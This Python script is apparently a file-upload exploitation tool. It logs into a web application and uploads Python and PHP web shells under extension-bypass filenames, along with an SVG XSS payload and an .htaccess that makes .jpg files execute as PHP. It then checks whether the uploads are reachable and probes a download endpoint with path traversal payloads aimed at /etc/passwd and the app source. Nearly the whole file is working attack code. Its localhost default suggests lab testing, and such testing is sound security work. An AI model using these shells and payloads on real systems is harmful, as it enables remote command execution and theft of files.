#!/usr/bin/env python3
"""file_upload.py - file upload exploitation and web shell testing"""

import argparse
import json
import re
import sys
import time

import requests
from colorama import Fore, Style, init

init(autoreset=True)

# simple python web shell content
WEBSHELL_CONTENT = """#!/usr/bin/env python3
import subprocess
import cgi
print("Content-Type: text/html\\n")
form = cgi.FieldStorage()
cmd = form.getvalue("cmd", "id")
print(f"<pre>{subprocess.getoutput(cmd)}</pre>")
"""

PHP_SHELL = '<?php echo shell_exec($_GET["cmd"]); ?>'


def banner():
    print(f"{Fore.CYAN}{'='*60}")
    print(f"  file_upload.py - upload exploitation")
    print(f"{'='*60}{Style.RESET_ALL}\n")


def authenticate(base_url, session):
    """login and return True if successful"""
    login_url = f"{base_url}/login"
    session.get(login_url, timeout=5)
    resp = session.post(login_url, data={"username": "john", "password": "password"},
                        timeout=5, allow_redirects=True)
    if "logout" in resp.text.lower():
        print(f"{Fore.YELLOW}[*] authenticated as john")
        return True
    print(f"{Fore.RED}[!] authentication failed")
    return False


def find_upload_endpoint(base_url, session):
    """look for file upload forms on the target"""
    print(f"{Fore.YELLOW}[*] looking for upload endpoints...")

    upload_url = f"{base_url}/upload"
    upload_field = "file"

    try:
        resp = session.get(upload_url, timeout=5)
        if resp.status_code == 200 and 'type="file"' in resp.text:
            # extract the actual field name
            match = re.search(r'name="([^"]*)"[^>]*type="file"', resp.text)
            if not match:
                match = re.search(r'type="file"[^>]*name="([^"]*)"', resp.text)
            if match:
                upload_field = match.group(1)
            print(f"{Fore.RED}  [+] found upload at: /upload (field: {upload_field})")
        else:
            print(f"{Fore.YELLOW}  [*] upload page returned {resp.status_code}, trying anyway")
    except requests.ConnectionError:
        print(f"{Fore.RED}  [!] connection failed")

    return upload_url, upload_field


def upload_file(session, upload_url, field_name, filename, content, content_type=None):
    """upload a file and return the response"""
    files = {field_name: (filename, content, content_type or "application/octet-stream")}
    try:
        resp = session.post(upload_url, files=files, timeout=10, allow_redirects=True)
        return resp
    except requests.ConnectionError:
        return None


def test_webshell_upload(base_url, session, upload_url, field_name):
    """try to upload a python/php web shell"""
    print(f"\n{Fore.YELLOW}[*] testing web shell upload...")
    results = []

    shells = [
        ("shell.py", WEBSHELL_CONTENT, "text/x-python"),
        ("shell.php", PHP_SHELL, "application/x-php"),
        ("shell.phtml", PHP_SHELL, "application/x-php"),
        ("shell.php.jpg", PHP_SHELL, "image/jpeg"),
        ("shell.py.png", WEBSHELL_CONTENT, "image/png"),
        ("shell.PhP", PHP_SHELL, "application/x-php"),
    ]

    for filename, content, ctype in shells:
        resp = upload_file(session, upload_url, field_name, filename, content, ctype)
        if resp is None:
            print(f"{Fore.RED}  [!] connection failed")
            break

        success = resp.status_code in [200, 302, 303]
        body_lower = resp.text.lower()
        rejected_indicators = ["not allowed", "invalid", "rejected", "forbidden",
                               "extension", "filetype"]
        rejected = any(ind in body_lower for ind in rejected_indicators)

        result = {
            "filename": filename,
            "status_code": resp.status_code,
            "uploaded": success and not rejected,
            "rejected": rejected
        }
        results.append(result)

        if success and not rejected:
            print(f"{Fore.RED}  [+] uploaded: {filename}")
        else:
            print(f"{Fore.GREEN}  [-] blocked: {filename}")

    return results


def test_various_uploads(base_url, session, upload_url, field_name):
    """upload different file types to see what's allowed"""
    print(f"\n{Fore.YELLOW}[*] testing various file type uploads...")
    results = []

    test_files = [
        ("test.jpg", b"\xff\xd8\xff\xe0" + b"\x00" * 100, "image/jpeg"),
        ("test.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 100, "image/png"),
        ("test.html", b"<h1>test</h1>", "text/html"),
        ("test.svg", b'<svg onload="alert(1)">', "image/svg+xml"),
        ("test.js", b"alert(1)", "application/javascript"),
        ("test.txt", b"just a text file", "text/plain"),
        (".htaccess", b"AddType application/x-httpd-php .jpg", "text/plain"),
    ]

    for filename, content, ctype in test_files:
        resp = upload_file(session, upload_url, field_name, filename, content, ctype)
        if resp is None:
            break

        success = resp.status_code in [200, 302, 303]
        body_lower = resp.text.lower()
        rejected = any(x in body_lower for x in ["not allowed", "invalid", "rejected"])

        result = {"filename": filename, "uploaded": success and not rejected}
        results.append(result)

        color = Fore.RED if (success and not rejected) else Fore.GREEN
        status = "uploaded" if (success and not rejected) else "blocked"
        print(f"{color}  [{'+' if status == 'uploaded' else '-'}] {filename}: {status}")

    return results


def check_uploaded_files(base_url, session, uploaded_files):
    """try to access the uploaded files via download endpoint and direct paths"""
    print(f"\n{Fore.YELLOW}[*] checking if uploaded files are accessible...")
    accessible = []

    for f in uploaded_files:
        if not f.get("uploaded"):
            continue
        filename = f["filename"]

        # try the download endpoint with directory traversal
        download_paths = [
            f"/download?file=uploads/{filename}",
            f"/download?file={filename}",
            f"/uploads/{filename}",
            f"/static/uploads/{filename}",
        ]

        for path in download_paths:
            url = f"{base_url}{path}"
            try:
                resp = session.get(url, timeout=5)
                if resp.status_code == 200 and len(resp.content) > 0:
                    print(f"{Fore.RED}  [+] accessible: {path}")
                    accessible.append({"filename": filename, "url": url, "path": path})
                    break
            except requests.ConnectionError:
                continue

    if not accessible:
        print(f"{Fore.GREEN}  [-] no uploaded files found accessible")

    return accessible


def test_directory_traversal(base_url, session):
    """test the download endpoint for directory traversal"""
    print(f"\n{Fore.YELLOW}[*] testing directory traversal via /download...")
    results = []

    traversal_payloads = [
        ("../../../etc/passwd", "/etc/passwd"),
        ("../../etc/passwd", "/etc/passwd"),
        ("../../../../etc/passwd", "/etc/passwd"),
        ("../app.py", "app source"),
        ("../../app.py", "app source"),
    ]

    for payload, desc in traversal_payloads:
        url = f"{base_url}/download?file={payload}"
        try:
            resp = session.get(url, timeout=5)
            if resp.status_code == 200 and len(resp.content) > 10:
                content_preview = resp.text[:100]
                is_hit = False
                if "root:" in resp.text:
                    is_hit = True
                elif "from flask" in resp.text.lower() or "import " in resp.text:
                    is_hit = True

                if is_hit:
                    print(f"{Fore.RED}  [+] traversal works: {payload} ({desc})")
                    results.append({
                        "payload": payload,
                        "description": desc,
                        "content_preview": content_preview,
                        "success": True
                    })
        except requests.ConnectionError:
            break

    if not results:
        print(f"{Fore.GREEN}  [-] directory traversal not exploitable")

    return results


def run_upload_test(target_url):
    """main upload testing routine"""
    banner()
    session = requests.Session()

    # authenticate first since upload requires login
    if not authenticate(target_url, session):
        return {
            "target": target_url,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "error": "authentication failed"
        }

    results = {
        "target": target_url,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "upload_endpoint": None,
        "webshell_tests": [],
        "filetype_tests": [],
        "accessible_files": [],
        "directory_traversal": []
    }

    upload_url, field_name = find_upload_endpoint(target_url, session)
    results["upload_endpoint"] = upload_url

    results["webshell_tests"] = test_webshell_upload(target_url, session,
                                                      upload_url, field_name)
    results["filetype_tests"] = test_various_uploads(target_url, session,
                                                      upload_url, field_name)

    all_uploaded = results["webshell_tests"] + results["filetype_tests"]
    results["accessible_files"] = check_uploaded_files(target_url, session,
                                                        all_uploaded)
    results["directory_traversal"] = test_directory_traversal(target_url, session)

    shells_up = sum(1 for r in results["webshell_tests"] if r.get("uploaded"))
    types_up = sum(1 for r in results["filetype_tests"] if r.get("uploaded"))
    accessible = len(results["accessible_files"])
    traversals = len(results["directory_traversal"])

    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"  upload test complete")
    print(f"  web shells uploaded: {shells_up}")
    print(f"  file types accepted: {types_up}/{len(results['filetype_tests'])}")
    print(f"  accessible files: {accessible}")
    print(f"  directory traversal: {traversals} paths")
    print(f"{'='*60}{Style.RESET_ALL}")

    return results


def main():
    parser = argparse.ArgumentParser(description="file_upload.py - upload exploitation")
    parser.add_argument("-t", "--target", default="http://localhost:5000",
                        help="target URL")
    parser.add_argument("-o", "--output", default="upload_results.json",
                        help="output file")
    args = parser.parse_args()

    results = run_upload_test(args.target)

    with open(args.output, "w") as f:
        json.dump(results, f, indent=2)
    print(f"\n{Fore.GREEN}[+] results saved to {args.output}")


if __name__ == "__main__":
    main()
